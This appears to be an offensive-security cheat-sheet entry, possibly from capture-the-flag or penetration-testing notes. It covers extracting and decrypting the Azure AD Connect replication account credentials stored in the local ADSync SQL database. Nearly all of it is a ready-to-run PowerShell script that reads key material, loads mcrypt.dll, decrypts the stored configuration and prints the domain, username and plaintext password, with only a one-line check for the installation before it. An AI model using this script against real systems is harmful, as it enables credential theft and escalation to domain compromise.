# Azure AD Connect Password Sync Decryption

Azure AD Connect stores the AD replication account credentials encrypted in a local SQL database (`ADSync`). If you have access as the service account user (`mhope`, etc.), decrypt to get plaintext credentials.

**Check for Azure AD Connect:**
```cmd
dir "C:\Program Files\Microsoft Azure AD Sync" 2>nul
```

**PowerShell script (upload and run as ADSync service account user):**
```powershell
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader(); $reader.Read() | Out-Null
$key_id = $reader.GetInt32(0); $instance_id = $reader.GetGuid(1); $entropy = $reader.GetGuid(2)
$reader.Close()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader(); $reader.Read() | Out-Null
$config = $reader.GetString(0); $crypted = $reader.GetString(1); $reader.Close()
Add-Type -Path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null; $km.GetActiveCredentialKey([ref]$key)
$key2 = $null; $km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = Select-Xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name='Domain';Expression={$_.node.InnerXML}}
$username = Select-Xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name='Username';Expression={$_.node.InnerXML}}
$password = Select-Xml -Content $decrypted -XPath "//attribute" | select @{Name='Password';Expression={$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain); Write-Host ("Username: " + $username.Username); Write-Host ("Password: " + $password.Password)
```

**Note:** Requires access as the ADSync service account or user with rights to the LocalDB instance.
